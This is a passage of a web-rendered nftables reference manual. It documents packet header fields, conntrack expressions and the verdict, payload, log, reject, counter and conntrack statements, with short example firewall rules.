expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>type</td><td>ICMP type field</td><td>icmp_type</td></tr><tr><td>code</td><td>ICMP code field</td><td>integer (8 bit)</td></tr><tr><td>checksum</td><td>ICMP checksum field</td><td>integer (16 bit)</td></tr><tr><td>id</td><td>ID of echo request/response</td><td>integer (16 bit)</td></tr><tr><td>sequence</td><td>sequence number of echo request/response</td><td>integer (16 bit)</td></tr><tr><td>gateway</td><td>gateway of redirects</td><td>integer (32 bit)</td></tr><tr><td>mtu</td><td>MTU of path MTU discovery</td><td>integer (16 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ipv6-header-expression">IPv6 header expression<a class="hash-link" href="#ipv6-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>ip6</em></strong> <!-- -->[<em>IPv6 header field</em>]</p><p><strong><em>Table 32. IPv6 header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>version</td><td>IP header version (6)</td><td>integer (4 bit)</td></tr><tr><td>dscp</td><td>Differentiated Services Code Point</td><td>dscp</td></tr><tr><td>ecn</td><td>Explicit Congestion Notification</td><td>ecn</td></tr><tr><td>flowlabel</td><td>Flow label</td><td>integer (20 bit)</td></tr><tr><td>length</td><td>Payload length</td><td>integer (16 bit)</td></tr><tr><td>nexthdr</td><td>Nexthdr protocol</td><td>inet_proto</td></tr><tr><td>hoplimit</td><td>Hop limit</td><td>integer (8 bit)</td></tr><tr><td>saddr</td><td>Source address</td><td>ipv6_addr</td></tr><tr><td>daddr</td><td>Destination address</td><td>ipv6_addr</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="icmpv6-header-expression">ICMPv6 header expression<a class="hash-link" href="#icmpv6-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>icmpv6</em></strong> <!-- -->[<em>ICMPv6 header field</em>]</p><p><strong><em>Table 33. ICMPv6 header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>type</td><td>ICMPv6 type field</td><td>icmpv6_type</td></tr><tr><td>code</td><td>ICMPv6 code field</td><td>integer (8 bit)</td></tr><tr><td>checksum</td><td>ICMPv6 checksum field</td><td>integer (16 bit)</td></tr><tr><td>parameter-problem</td><td>pointer to problem</td><td>integer (32 bit)</td></tr><tr><td>packet-too-big</td><td>oversized MTU</td><td>integer (32 bit)</td></tr><tr><td>id</td><td>ID of echo request/response</td><td>integer (16 bit)</td></tr><tr><td>sequence</td><td>sequence number of echo request/response</td><td>integer (16 bit)</td></tr><tr><td>max-delay</td><td>maximum response delay of MLD queries</td><td>integer (16 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="tcp-header-expression">TCP header expression<a class="hash-link" href="#tcp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>tcp</em></strong> <!-- -->[<em>TCP header field</em>]</p><p><strong><em>Table 34. TCP header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>sport</td><td>Source port</td><td>inet_service</td></tr><tr><td>dport</td><td>Destination port</td><td>inet_service</td></tr><tr><td>sequence</td><td>Sequence number</td><td>integer (32 bit)</td></tr><tr><td>ackseq</td><td>Acknowledgement number</td><td>integer (32 bit)</td></tr><tr><td>doff</td><td>Data offset</td><td>integer (4 bit) FIXME scaling</td></tr><tr><td>reserved</td><td>Reserved area</td><td>integer (4 bit)</td></tr><tr><td>flags</td><td>TCP flags</td><td>tcp_flag</td></tr><tr><td>window</td><td>Window</td><td>integer (16 bit)</td></tr><tr><td>checksum</td><td>Checksum</td><td>integer (16 bit)</td></tr><tr><td>urgptr</td><td>Urgent pointer</td><td>integer (16 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="udp-header-expression">UDP header expression<a class="hash-link" href="#udp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>udp</em></strong> <!-- -->[<em>UDP header field</em>]</p><p><strong><em>Table 35. UDP header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>sport</td><td>Source port</td><td>inet_service</td></tr><tr><td>dport</td><td>Destination port</td><td>inet_service</td></tr><tr><td>length</td><td>Total packet length</td><td>integer (16 bit)</td></tr><tr><td>checksum</td><td>Checksum</td><td>integer (16 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="udp-lite-header-expression">UDP-Lite header expression<a class="hash-link" href="#udp-lite-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>udplite</em></strong> <!-- -->[<em>UDP-Lite header field</em>]</p><p><strong><em>Table 36. UDP-Lite header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>sport</td><td>Source port</td><td>inet_service</td></tr><tr><td>dport</td><td>Destination port</td><td>inet_service</td></tr><tr><td>checksum</td><td>Checksum</td><td>integer (16 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="sctp-header-expression">SCTP header expression<a class="hash-link" href="#sctp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>sctp</em></strong> <!-- -->[<em>SCTP header field</em>]</p><p><strong><em>Table 37. SCTP header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>sport</td><td>Source port</td><td>inet_service</td></tr><tr><td>dport</td><td>Destination port</td><td>inet_service</td></tr><tr><td>vtag</td><td>Verfication Tag</td><td>integer (32 bit)</td></tr><tr><td>checksum</td><td>Checksum</td><td>integer (32 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="dccp-header-expression">DCCP header expression<a class="hash-link" href="#dccp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>dccp</em></strong> <!-- -->[<em>DCCP header field</em>]</p><p><strong><em>Table 38. DCCP header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>sport</td><td>Source port</td><td>inet_service</td></tr><tr><td>dport</td><td>Destination port</td><td>inet_service</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="authentication-header-expression">Authentication header expression<a class="hash-link" href="#authentication-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>ah</em></strong> <!-- -->[<em>AH header field</em>]</p><p><strong><em>Table 39. AH header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>nexthdr</td><td>Next header protocol</td><td>inet_proto</td></tr><tr><td>hdrlength</td><td>AH Header length</td><td>integer (8 bit)</td></tr><tr><td>reserved</td><td>Reserved area</td><td>integer (16 bit)</td></tr><tr><td>spi</td><td>Security Parameter Index</td><td>integer (32 bit)</td></tr><tr><td>sequence</td><td>Sequence number</td><td>integer (32 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="encrypted-security-payload-header-expression">Encrypted security payload header expression<a class="hash-link" href="#encrypted-security-payload-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>esp</em></strong> <!-- -->[<em>ESP header field</em>]</p><p><strong><em>Table 40. ESP header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>spi</td><td>Security Parameter Index</td><td>integer (32 bit)</td></tr><tr><td>sequence</td><td>Sequence number</td><td>integer (32 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ipcomp-header-expression">IPcomp header expression<a class="hash-link" href="#ipcomp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>comp</em></strong> <!-- -->[<em>IPComp header field</em>]</p><p><strong><em>Table 41. IPComp header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>nexthdr</td><td>Next header protocol</td><td>inet_proto</td></tr><tr><td>flags</td><td>Flags</td><td>bitmask</td></tr><tr><td>cpi</td><td>Compression Parameter Index</td><td>integer (16 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="extension-header-expressions">Extension header expressions<a class="hash-link" href="#extension-header-expressions" title="标题的直接链接">​</a></h3><p>Extension header expressions refer to data from variable-sized protocol headers, such as IPv6 extension headers and TCPs options.</p><p>nftables currently supports matching (finding) a given ipv6 extension header or TCP option.</p><p><code>hbh {nexthdr | hdrlength}</code></p><p><code>frag {nexthdr | frag-off | more-fragments | id}</code></p><p><code>rt {nexthdr | hdrlength | type | seg-left}</code></p><p><code>dst {nexthdr | hdrlength}</code></p><p><code>mh {nexthdr | hdrlength | checksum | type}</code></p><p><code>tcp option {eol | noop | maxseg | window | sack-permitted | sack | sack0 | sack1 | sack2 | sack3 | timestamp} [_tcp_option_field_]</code></p><p>The following syntaxes are valid only in a relational expression with boolean type on right-hand side for checking header existence only:</p><p><code>exthdr {hbh | frag | rt | dst | mh}</code></p><p><code>tcp option {eol | noop | maxseg | window | sack-permitted | sack | sack0 | sack1 | sack2 | sack3 | timestamp}</code></p><p><strong><em>Table 42. IPv6 extension headers</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th></tr></thead><tbody><tr><td>hbh</td><td>Hop by Hop</td></tr><tr><td>rt</td><td>Routing Header</td></tr><tr><td>frag</td><td>Fragmentation header</td></tr><tr><td>dst</td><td>dst options</td></tr><tr><td>mh</td><td>Mobility Header</td></tr></tbody></table><p><strong><em>Table 43. TCP Options</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>TCP option fields</th></tr></thead><tbody><tr><td>eol</td><td>End of option list</td><td>kind</td></tr><tr><td>noop</td><td>1 Byte TCP No-op options</td><td>kind</td></tr><tr><td>maxseg</td><td>TCP Maximum Segment Size</td><td>kind, length, size</td></tr><tr><td>window</td><td>TCP Window Scaling</td><td>kind, length, count</td></tr><tr><td>sack-permitted</td><td>TCP SACK permitted</td><td>kind, length</td></tr><tr><td>sack</td><td>TCP Selective Acknowledgement (alias of block 0)</td><td>kind, length, left, right</td></tr><tr><td>sack0</td><td>TCP Selective Acknowledgement (block 0)</td><td>kind, length, left, right</td></tr><tr><td>sack1</td><td>TCP Selective Acknowledgement (block 1)</td><td>kind, length, left, right</td></tr><tr><td>sack2</td><td>TCP Selective Acknowledgement (block 2)</td><td>kind, length, left, right</td></tr><tr><td>sack3</td><td>TCP Selective Acknowledgement (block 3)</td><td>kind, length, left, right</td></tr><tr><td>timestamp</td><td>TCP Timestamps</td><td>kind, length, tsval, tsecr</td></tr></tbody></table><p><strong><em>示例 14. finding TCP options</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">filter input tcp option sack-permitted kind 1 counter</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 15. matching IPv6 exthdr</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ip6 filter input frag more-fragments 1 counter</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="conntrack-expressions">Conntrack expressions<a class="hash-link" href="#conntrack-expressions" title="标题的直接链接">​</a></h3><p>Conntrack expressions refer to meta data of the connection tracking entry associated with a packet.</p><p>There are three types of conntrack expressions. Some conntrack expressions require the flow direction before the conntrack key, others must be used directly because they are direction agnostic. The <strong><em>packets</em></strong>, <strong><em>bytes</em></strong> and <strong><em>avgpkt</em></strong> keywords can be used with or without a direction. If the direction is omitted, the sum of the original and the reply direction is returned. The same is true for the <strong><em>zone</em></strong>, if a direction is given, the zone is only matched if the zone id is tied to the given direction.</p><p><code>ct {state | direction | status | mark | expiration | helper | label | l3proto | protocol | bytes | packets | avgpkt | zone}</code></p><p><code>ct {original | reply} {l3proto | protocol | saddr | daddr | proto-src | proto-dst | bytes | packets | avgpkt | zone}</code></p><p><strong><em>Table 44. Conntrack expressions</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>state</td><td>State of the connection</td><td>ct_state</td></tr><tr><td>direction</td><td>Direction of the packet relative to the connection</td><td>ct_dir</td></tr><tr><td>status</td><td>Status of the connection</td><td>ct_status</td></tr><tr><td>mark</td><td>Connection mark</td><td>mark</td></tr><tr><td>expiration</td><td>Connection expiration time</td><td>time</td></tr><tr><td>helper</td><td>Helper associated with the connection</td><td>string</td></tr><tr><td>label</td><td>Connection tracking label bit or symbolic name defined in connlabel.conf in the nftables include path</td><td>ct_label</td></tr><tr><td>l3proto</td><td>Layer 3 protocol of the connection</td><td>nf_proto</td></tr><tr><td>saddr</td><td>Source address of the connection for the given direction</td><td>ipv4_addr/ipv6_addr</td></tr><tr><td>daddr</td><td>Destination address of the connection for the given direction</td><td>ipv4_addr/ipv6_addr</td></tr><tr><td>protocol</td><td>Layer 4 protocol of the connection for the given direction</td><td>inet_proto</td></tr><tr><td>proto-src</td><td>Layer 4 protocol source for the given direction</td><td>integer (16 bit)</td></tr><tr><td>proto-dst</td><td>Layer 4 protocol destination for the given direction</td><td>integer (16 bit)</td></tr><tr><td>packets</td><td>packet count seen in the given direction or sum of original and reply</td><td>integer (64 bit)</td></tr><tr><td>bytes</td><td>bytecount seen, see description for <strong><em>packets</em></strong> keyword</td><td>integer (64 bit)</td></tr><tr><td>avgpkt</td><td>average bytes per packet, see description for <strong><em>packets</em></strong> keyword</td><td>integer (64 bit)</td></tr><tr><td>zone</td><td>conntrack zone</td><td>integer (16 bit)</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="statements">Statements<a class="hash-link" href="#statements" title="标题的直接链接">​</a></h2><p>Statements represent actions to be performed. They can alter control flow (return, jump to a different chain, accept or drop the packet) or can perform actions, such as logging, rejecting a packet, etc.</p><p>Statements exist in two kinds. Terminal statements unconditionally terminate evaluation of the current rule, non-terminal statements either only conditionally or never terminate evaluation of the current rule, in other words, they are passive from the ruleset evaluation perspective. There can be an arbitrary amount of non-terminal statements in a rule, but only a single terminal statement as the final statement.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="verdict-statement">Verdict statement<a class="hash-link" href="#verdict-statement" title="标题的直接链接">​</a></h3><p>The verdict statement alters control flow in the ruleset and issues policy decisions for packets.</p><p><code>{accept | drop | queue | continue | return}</code></p><p><code>{jump | goto} {chain}</code></p><p><code>accept</code></p><dd><p>Terminate ruleset evaluation and accept the packet.</p></dd><p><code>drop</code></p><dd><p>Terminate ruleset evaluation and drop the packet.</p></dd><p><code>queue</code></p><dd><p>Terminate ruleset evaluation and queue the packet to userspace.</p></dd><p><code>continue</code></p><dd><p>Continue ruleset evaluation with the next rule. FIXME</p></dd><p><code>return</code></p><dd><p>Return from the current chain and continue evaluation at the next rule in the last chain. If issued in a base chain, it is equivalent to <strong><em>accept</em></strong>.</p></dd><p><code>jump chain</code></p><dd><p>Continue evaluation at the first rule in chain. The current position in the ruleset is pushed to a call stack and evaluation will continue there when the new chain is entirely evaluated of a <strong><em>return</em></strong> verdict is issued.</p></dd><p><code>goto chain</code></p><dd><p>Similar to <strong><em>jump</em></strong>, but the current position is not pushed to the call stack, meaning that after the new chain evaluation will continue at the last chain instead of the one containing the goto statement.</p></dd><p><strong><em>示例 16. Verdict statements</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># process packets from eth0 and the internal network in from_lan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># chain, drop all packets from eth0 with different source addresses.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input iif eth0 ip saddr 192.168.0.0/24 jump from_lan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input iif eth0 drop</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="payload-statement">Payload statement<a class="hash-link" href="#payload-statement" title="标题的直接链接">​</a></h3><p>The payload statement alters packet content. It can be used for example to set ip DSCP (differv) header field or ipv6 flow labels.</p><p><strong><em>示例 17. route some packets instead of bridging</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># redirect tcp:http from 192.160.0.0/16 to local machine for routing instead of bridging</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># assumes 00:11:22:33:44:55 is local MAC address.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bridge input meta iif eth0 ip saddr 192.168.0.0/16 tcp dport 80 meta pkttype set unicast ether daddr set 00:11:22:33:44:55</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 18. Set IPv4 DSCP header field</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ip forward ip dscp set 42</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="log-statement">Log statement<a class="hash-link" href="#log-statement" title="标题的直接链接">​</a></h3><p><code>log [prefix _quoted_string_] [level _syslog-level_] [flags log-flags]</code></p><p><code>log [group _nflog_group_] [prefix _quoted_string_] [queue-threshold value] [snaplen size]</code></p><p>The log statement enables logging of matching packets. When this statement is used from a rule, the Linux kernel will print some information on all matching packets, such as header fields, via the kernel log (where it can be read with dmesg(1) or read in the syslog). If the group number is specified, the Linux kernel will pass the packet to nfnetlink_log which will multicast the packet through a netlink socket to the specified multicast group. One or more userspace processes may subscribe to the group to receive the packets, see libnetfilter_queue documentation for details. This is a non-terminating statement, so the rule evaluation continues after the packet is logged.</p><p><strong><em>Table 45. log statement options</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>prefix</td><td>Log message prefix</td><td>quoted string</td></tr><tr><td>syslog-level</td><td>Syslog level of logging</td><td>string: emerg, alert, crit, err, warn <!-- -->[default]<!-- -->, notice, info, debug</td></tr><tr><td>group</td><td>NFLOG group to send messages to</td><td>unsigned integer (16 bit)</td></tr><tr><td>snaplen</td><td>Length of packet payload to include in netlink message</td><td>unsigned integer (32 bit)</td></tr><tr><td>queue-threshold</td><td>Number of packets to queue inside the kernel before sending them to userspace</td><td>unsigned integer (32 bit)</td></tr></tbody></table><p><strong><em>Table 46. log-flags</em></strong></p><table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td>tcp sequence</td><td>Log TCP sequence numbers.</td></tr><tr><td>tcp options</td><td>Log options from the TCP packet header.</td></tr><tr><td>ip options</td><td>Log options from the IP/IPv6 packet header.</td></tr><tr><td>skuid</td><td>Log the userid of the process which generated the packet.</td></tr><tr><td>ether</td><td>Decode MAC addresses and protocol.</td></tr><tr><td>all</td><td>Enable all log flags listed above.</td></tr></tbody></table><p><strong><em>示例 19. Using log statement</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># log the UID which generated the packet and ip options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip filter output log flags skuid flags ip options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># log the tcp sequence numbers and tcp options from the TCP packet</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip filter output log flags tcp sequence,options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># enable all supported log flags</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip6 filter output log flags all</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="reject-statement">Reject statement<a class="hash-link" href="#reject-statement" title="标题的直接链接">​</a></h3><p><code>reject [with] {icmp | icmp6 | icmpx} [type] {icmp_type | icmp6_type | icmpx_type}</code></p><p><code>reject [with] {tcp} {reset}</code></p><p>A reject statement is used to send back an error packet in response to the matched packet otherwise it is equivalent to drop so it is a terminating statement, ending rule traversal. This statement is only valid in the input, forward and output chains, and user-defined chains which are only called from those chains.</p><p><strong><em>Table 47. reject statement type (ip)</em></strong></p><table><thead><tr><th>Value</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>icmp_type</td><td>ICMP type response to be sent to the host</td><td>net-unreachable, host-unreachable, prot-unreachable, port-unreachable <!-- -->[default]<!-- -->, net-prohibited, host-prohibited, admin-prohibited</td></tr></tbody></table><p><strong><em>Table 48. reject statement type (ip6)</em></strong></p><table><thead><tr><th>Value</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>icmp6_type</td><td>ICMPv6 type response to be sent to the host</td><td>no-route, admin-prohibited, addr-unreachable, port-unreachable <!-- -->[default]<!-- -->, policy-fail, reject-route</td></tr></tbody></table><p><strong><em>Table 49. reject statement type (inet)</em></strong></p><table><thead><tr><th>Value</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>icmpx_type</td><td>ICMPvXtype abstraction response to be sent to the host, this is a set of types that overlap in IPv4 and IPv6 to be used from the inet family.</td><td>port-unreachable <!-- -->[default]<!-- -->, admin-prohibited, no-route, host-unreachable</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="counter-statement">Counter statement<a class="hash-link" href="#counter-statement" title="标题的直接链接">​</a></h3><p>A counter statement sets the hit count of packets along with the number of bytes.</p><p><code>counter {packets _number_ } {bytes _number_ }</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="conntrack-statement">Conntrack statement<a class="hash-link" href="#conntrack-statement" title="标题的直接链接">​</a></h3><p>The conntrack statement can be used to set the conntrack mark and conntrack labels.</p><p><code>ct {mark | eventmask | label | zone} [set] value</code></p><p>The ct statement sets meta data associated with a connection. The zone id has to be assigned before a conntrack lookup takes place, i.e. this has to be done in prerouting and possibly output (if locally generated packets need to be placed in a distinct zone), with a hook priority of -300.</p><p><strong><em>Table 50. Conntrack statement types</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Value</th></tr></thead><tbody><tr><td>eventmask</td><td>conntrack event bits</td><td>bitmask, integer (32 bit)</td></tr><tr><td>helper</td><td>name of ct helper object to assign to the connection</td><td>quoted string</td></tr><tr><td>mark</td><td>Connection tracking mark</td><td>mark</td></tr><tr><td>label</td><td>Connection tracking label</td><td>label</td></tr><tr><td>zone</td><td>conntrack zone</td><td>integer (16 bit)</td></tr></tbody></table><p><strong><em>示例 20. save packet nfmark in conntrack</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ct mark set meta mark</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>示例 21. set zone mapped via interface</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">table inet raw {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  chain prerouting {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      type filter hook prerouting priority -300;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ct zone set iif map { "eth1" : 1, "veth1" : 2 }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  chain output {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      type filter hook output priority -300;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ct zone set oif map { "eth1" : 1, "veth1" : 2 }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div 